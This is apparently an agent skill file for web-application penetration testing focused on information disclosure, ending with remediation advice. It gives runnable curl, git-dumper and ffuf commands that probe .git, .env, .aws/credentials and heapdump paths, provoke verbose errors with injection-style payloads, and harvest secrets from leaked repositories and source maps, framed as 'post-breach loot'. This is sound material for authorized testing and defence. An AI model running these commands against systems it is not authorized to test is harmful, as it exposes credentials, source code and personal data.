---
name: information-disclosure
description: Discover sensitive data exposure and information disclosure leaks via debug endpoints verbose error messages source maps git directories backup files directory listings API responses and response header analysis enabling further compromise.
---

# Information Disclosure & Sensitive Data Exposure

Information disclosure is the low-effort, high-yield bug class that unlocks every downstream attack. Leaked stack traces reveal framework versions, absolute paths, and ORM queries; exposed `/.git/` mirrors the entire codebase including secrets; verbose API responses leak PII and internal identifiers. Treat every 404, every response body, and every header as a potential leak source.

## When to use this skill

- Initial recon on a target with unknown tech stack or CMS.
- Hunting secrets (credentials, API keys, SMTP tokens) before deeper exploitation.
- Stuck on a black-box target — verbose errors often hand you the injection point.
- Post-breach loot: dumping source code, configs, and databases from VCS leaks.
- Reporting: distinguishing real impact (leaked keys, PII) from noise (version banners).

## Methodology

### 1. Systematic Hunt Checklist — Fingerprint the Obvious First

Enumerate the classic leak paths before fuzzing. These are checked in almost every recon workflow because they are frequently forgotten in deployments. Hit each path and evaluate status, size, and content — not just the status code (many servers return 200 with a custom 404 page).

```bash
TARGET=http://target.com
for p in robots.txt sitemap.xml .git/ .git/config .env .svn/entries \
         .DS_Store server-status .aws/credentials .htaccess \
         actuator actuator/env actuator/heapdump actuator/mappings \
         debug trace .bak .sql .zip .old .swp backup web.config.bak; do
  printf "[%-24s] " "$p"
  curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$TARGET/$p"
done
curl -sk http://target.com/robots.txt                       # hidden paths
curl -sk http://target.com/actuator | jq .                  # Spring Boot subsystems
curl -sk http://target.com/actuator/heapdump -o hd.bin      # strings hd.bin | grep -i pass
```

Note: `.DS_Store` inside a webroot frequently reveals filenames for files the directory listing never showed — parse it (`pip3 install ds_store`, iterate `DSStore` entries) and feed recovered names back into step 2's wordlist.

### 2. Directory Listing Exploitation & `/.git/` Recovery with git-dumper

An open directory listing (`Index of /`) is a map of everything not meant to be public. Chain it: list directories, descend into `/backup/`, `/uploads/`, `/old/`, `/config/`, and read every file. Apache autoindex, nginx `autoindex on`, and Tomcat listings all count.

```bash
# Detect a listing — look for <h1>Index of /</h1>
curl -sk http://target.com/backup/ | grep -i "Index of\|parent directory"
# Then walk it non-recursively, harvesting filenames
curl -sk http://target.com/backup/ | grep -oP 'href="\K[^"]+' | grep -v '\.\./\|?'

# Grab any juicy file immediately
curl -sk http://target.com/backup/site-2024.tar.gz -o site.tar.gz
tar tzf site.tar.gz | head -40    # inventory before extracting
```

Exposed `/.git/` is the jackpot. Do NOT manually fetch `HEAD`/`config` and improvise — use a dumper that walks `logs/HEAD` hashes to reconstruct all objects, branches, and deleted files.

```bash
pip3 install git-dumper
git-dumper http://target.com/.git/ leaked-repo/
cd leaked-repo
git log --oneline --all                      # full commit history
git diff HEAD~5 HEAD                          # what changed recently (often removed secrets)
git grep -iE "password|api[_-]?key|secret|token|AKIA" -- .  # hunt secrets in all history
cat .git/config                               # may leak internal repo URLs & creds
git fsck --lost-found                         # recover dangling/unreferenced objects
```

Same workflow applies to `.svn/` (use `svn-dumper`), `.hg/`, and `.DS_Store`-enabled directory reconstruction.

### 3. Verbose Error Disclosure — Trigger, Extract, Pivot

Verbose errors expose stack traces, absolute paths, SQL fragments, internal hostnames, and exact framework versions — the intelligence needed to select an exploit. Trigger them deliberately with malformed input rather than waiting for them to happen.

```bash
for v in "'%20%27" "<script>" "%00" "[]{}" "{{7*7}}" "\\\\" "A%1000"; do
  curl -sk "http://target.com/search?q=${v}" | grep -iE "traceback|exception|Caused by|SELECT|Warning"
done
curl -sk "http://target.com/index.php?debug=true&XDEBUG_SESSION_START=1"
curl -sk "http://target.com/index.aspx?aspxerrorpath=/x"        # ASP.NET verbose page
curl -sk -H "X-Forwarded-For: 127.0.0.1" -H "X-Debug: 1" http://target.com/admin
# SQL fragments confirm query syntax/columns: PDOException ... SELECT * FROM users WHERE id='1'
# Absolute paths (/var/www/html/app/config/db.php) reveal deploy layout & docroot
```

Framework fingerprints found in traces map directly to known CVEs: `Tomcat/8.5.x` in tracebacks, `Spring Boot 2.1.0` in actuator JSON, `PHP 7.0.33` in `X-Powered-By` corroborated by stack text. Cross-check every version against Exploit-DB before fuzzing further.

### 4. HTTP Response Header Analysis

Headers leak server identity, proxy chains, frameworks, and occasionally entire sitemap URLs. Inspect all of `Server`, `X-Powered-By`, `X-Debug-Token`, `X-Runtime`, `Via`, `X-AspNet-Version`, and any non-standard headers.

```bash
# Full header dump per endpoint — collect for every discovered path
curl -skI http://target.com/ ; curl -skI http://target.com/admin ; curl -skI http://target.com/api

# Symfony profiler leaks X-Debug-Token — the token unlocks /_profiler/<token>
curl -skI http://target.com/ | grep -i x-debug-token
curl -sk http://target.com/_profiler/$(curl -skI http://target.com/ | grep -i x-debug-token | cut -d' ' -f2)

# X-Debug-Token Link header exposes profiler URL directly; stray sitemap headers happen too
curl -skI http://target.com/ | grep -iE "x-debug-token-link|x-sitemap|sitemap"

# X-Varnish / X-Cache-Hits reveal proxy topology for SSRF/cache-poisoning chaining
```

### 5. Source Map (`.map`) Recovery

If the frontend ships `.js` files with a trailing `//# sourceMappingURL=app.js.map`, the minified production bundle can be reconstructed back into readable source — with comments, original file structure, and embedded env variables.

```bash
# Find every sourceMappingURL reference in shipped JS
curl -sk http://target.com/js/app.js | grep -o "sourceMappingURL=[^ ]*"
# Convention: try the map path explicitly for every discovered .js
for f in app vendor main index; do
  curl -sk -o /dev/null -w "%{http_code} $f.js.map\n" http://target.com/js/$f.js.map
done

# Reconstruct readable sources: sourcesContent holds the full original files
curl -sk http://target.com/js/app.js.map | python3 -c "
import json,sys,os
m=json.load(sys.stdin)
for i,src in enumerate(m.get('sourcesContent') or []):
    name=m['sources'][i].lstrip('/').replace('..','_')
    os.makedirs(os.path.dirname(name),exist_ok=True)
    open(name,'w').write(src)
"
grep -rniE "api[_-]?key|secret|password|token|AKIA|firebase" ./recovered/
```

Tools like `get-sourcemaps`, `map-recon`, or Burp's "Find references" speed this up — but the manual `sourcesContent` extraction above always works.

### 6. Version-Control & Config Wordlist Fuzzing with ffuf

Automate step 1 across all hosts and subdomains. Use targeted wordlists rather than generic brute lists — precision beats volume for disclosure checks.

```bash
# Git-dedicated wordlist (or SecLists: discovery/ and vcs/)
cat > vcs.txt <<'EOF'
.git/
.git/config
.git/logs/HEAD
.git/FETCH_HEAD
.svn/wc.db
.svn/entries
.hg/hgrc
.env
.env.bak
.env.production
web.config.bak
composer.lock
package-lock.json
db.sql
dump.sql
site.zip
backup.zip
.bash_history
.DS_Store
EOF

ffuf -u http://target.com/FUZZ -w vcs.txt -mc 200,204,301,302,401,403 \
     -fs 0 -t 30 -o ffuf-vcs.json -of json

# Backup-extension sweep on discovered filenames (.bak .old .swp .sql .zip)
ffuf -u http://target.com/FUZZ.EXT -w discovered-files.txt \
     -H "X-Forwarded-Host: FUZZ" -mc 200 -ac
```

Correlate: any 200 with size > 0 on `.env`, `.git/config`, `*.sql`, or `*.zip` should be downloaded and grepped immediately — these usually contain credentials that escalate the whole engagement.

### Remediation

- **Generic error pages**: never return stack traces, SQL fragments, or absolute paths; return a generic message with a correlation ID, and log details server-side only.
- **Remove VCS dirs from deploy**: exclude `.git/`, `.svn/`, `.hg/` from deployment artifacts (`.gitignore` isn't enough — check the actual build pipeline), and deny web access to dot-directories at the web server layer.
- **Strip headers**: remove `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Debug-Token`; disable framework banners and directory listings (`autoindex off`).
- **Least-privilege API responses**: return only fields the caller needs (DTO projection), never raw ORM objects; suppress `debug=true` query params in production; lock down actuator/`/_profiler`/`/trace` behind auth and internal networking.
- **Delete backups from webroot**: never store `.bak/.old/.zip/.sql` dumps inside the served tree; rotate any credentials found in exposed files immediately, since disclosure may have been live for months.
